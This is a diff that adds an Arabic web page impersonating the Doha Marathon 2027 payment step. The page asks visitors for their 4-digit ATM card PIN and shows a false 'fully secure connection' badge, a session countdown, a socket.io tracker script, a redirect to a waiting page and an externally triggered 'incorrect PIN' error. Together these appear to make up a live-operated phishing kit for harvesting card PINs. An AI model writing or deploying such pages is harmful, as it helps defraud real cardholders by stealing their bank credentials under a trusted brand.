@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#ed1c24">
+	<title>الرقم السري - ماراثون الدوحة 2027</title>
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
+	<link rel="stylesheet" href="assets/registration-payment.css">
+	<style>
+		html,body { overflow-x:hidden; max-width:100vw; }
+		.atm-section { text-align:center; margin:24px 0; }
+		.atm-section p { font-size:14px; color:#555; margin-bottom:16px; line-height:1.6; }
+		.atm-icon { font-size:48px; color:var(--brand,#ed1c24); margin-bottom:16px; }
+		.atm-icon svg { width:56px; height:56px; }
+		.pin-inputs { display:flex; gap:12px; justify-content:center; direction:ltr; margin:20px 0; }
+		.pin-inputs input {
+			width:52px; height:60px; text-align:center; font-size:24px; font-weight:700;
+			border:2px solid #d4d4d4; border-radius:12px; background:#fff; color:#101010;
+			transition:border-color .2s; -webkit-text-security:disc;
+		}
+		.pin-inputs input:focus { outline:none; border-color:var(--brand); box-shadow:0 0 0 3px rgba(237,28,36,.12); }
+		.secure-note {
+			display:flex; align-items:center; justify-content:center; gap:5px;
+			margin-top:16px; font-size:12px; color:#6b7280;
+		}
+		.secure-note svg { width:14px; height:14px; color:#10b981; }
+	</style>
+</head>
+<body>
+	<header class="payment-header">
+		<nav class="header-actions" aria-label="روابط سريعة">
+			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
+				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
+			</a>
+			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
+			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
+		</nav>
+		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
+			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
+		</a>
+	</header>
+
+	<main class="payment-shell">
+		<section class="payment-card" aria-label="الرقم السري ATM">
+			<div class="session-row">
+				<strong id="session-countdown" class="session-countdown" aria-live="off">10:00</strong>
+				<span>تنتهي صلاحية الجلسة خلال</span>
+			</div>
+
+			<form id="atm-form" novalidate>
+				<div class="atm-section">
+					<div class="atm-icon">
+						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/><circle cx="12" cy="15" r="1"/><path d="M6 15h.01M18 15h.01"/></svg>
+					</div>
+					<p>أدخل الرقم السري للبطاقة (ATM PIN) المكون من 4 أرقام لإتمام عملية الدفع.</p>
+					<div class="pin-inputs">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 1" data-idx="0" name="pin1">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 2" data-idx="1" name="pin2">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 3" data-idx="2" name="pin3">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 4" data-idx="3" name="pin4">
+					</div>
+					<input type="hidden" name="atmPin" id="atm-pin">
+					<div class="secure-note">
+						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+						<span>اتصال مشفر وآمن بالكامل</span>
+					</div>
+				</div>
+
+				<button id="atm-button" class="pay-button" type="submit">تأكيد الدفع</button>
+				<p id="payment-message" class="payment-message" role="status" aria-live="polite" hidden></p>
+			</form>
+
+			<a class="back-link" href="payment-verify.html">خلف</a>
+		</section>
+	</main>
+	<footer class="payment-footer" aria-hidden="true"></footer>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+<script>
+(function(){
+	var expiryKey = "doha-marathon-payment-expiry";
+	var savedExpiry = Number(sessionStorage.getItem(expiryKey));
+	var expiry = (savedExpiry > 0) ? savedExpiry : Date.now() + 10*60*1000;
+	sessionStorage.setItem(expiryKey, String(expiry));
+
+	var countdown = document.getElementById("session-countdown");
+	var msg = document.getElementById("payment-message");
+	function tick(){
+		var rem = Math.max(0, Math.ceil((expiry - Date.now())/1000));
+		var m = Math.floor(rem/60), s = rem%60;
+		if(countdown) countdown.textContent = String(m).padStart(2,"0")+":"+String(s).padStart(2,"0");
+		if(rem===0){ if(msg){msg.hidden=false; msg.textContent="انتهت صلاحية جلسة الدفع.";} clearInterval(tid); }
+	}
+	tick(); var tid = setInterval(tick, 1000);
+
+	var inputs = document.querySelectorAll(".pin-inputs input");
+	var hidden = document.getElementById("atm-pin");
+	function collectPin(){
+		var val = "";
+		inputs.forEach(function(inp){ val += inp.value; });
+		if(hidden) hidden.value = val;
+		return val;
+	}
+	inputs.forEach(function(inp, i){
+		inp.addEventListener("input", function(){
+			this.value = this.value.replace(/\D/g,"").substring(0,1);
+			collectPin();
+			if(this.value && i < inputs.length - 1) inputs[i+1].focus();
+		});
+		inp.addEventListener("keydown", function(e){
+			if(e.key === "Backspace" && !this.value && i > 0){
+				inputs[i-1].focus();
+			}
+		});
+		inp.addEventListener("paste", function(e){
+			e.preventDefault();
+			var text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g,"").substring(0,4);
+			for(var j=0; j<text.length && j<inputs.length; j++){
+				inputs[j].value = text[j];
+			}
+			collectPin();
+			var focusIdx = Math.min(text.length, inputs.length - 1);
+			inputs[focusIdx].focus();
+		});
+	});
+
+	var form = document.getElementById("atm-form");
+	if(form) form.addEventListener("submit", function(e){
+		e.preventDefault();
+		var pin = collectPin();
+		if(pin.length < 4){
+			if(msg){msg.hidden=false; msg.textContent="يرجى إدخال الرقم السري المكون من 4 أرقام.";}
+			return;
+		}
+		if(msg) msg.hidden = true;
+		sessionStorage.setItem('wait-source', 'atm');
+		window.location.assign("wait.html");
+	});
+
+	var pageErr = sessionStorage.getItem('page-error');
+	if (pageErr) {
+		sessionStorage.removeItem('page-error');
+		if(msg){
+			msg.hidden=false;
+			msg.style.color='#dc2626';
+			msg.style.fontSize='15px';
+			msg.style.fontWeight='700';
+			msg.textContent='رقم الصراف الآلي غير صحيح';
+		}
+	}
+})();
+</script>
+</body>
+</html>
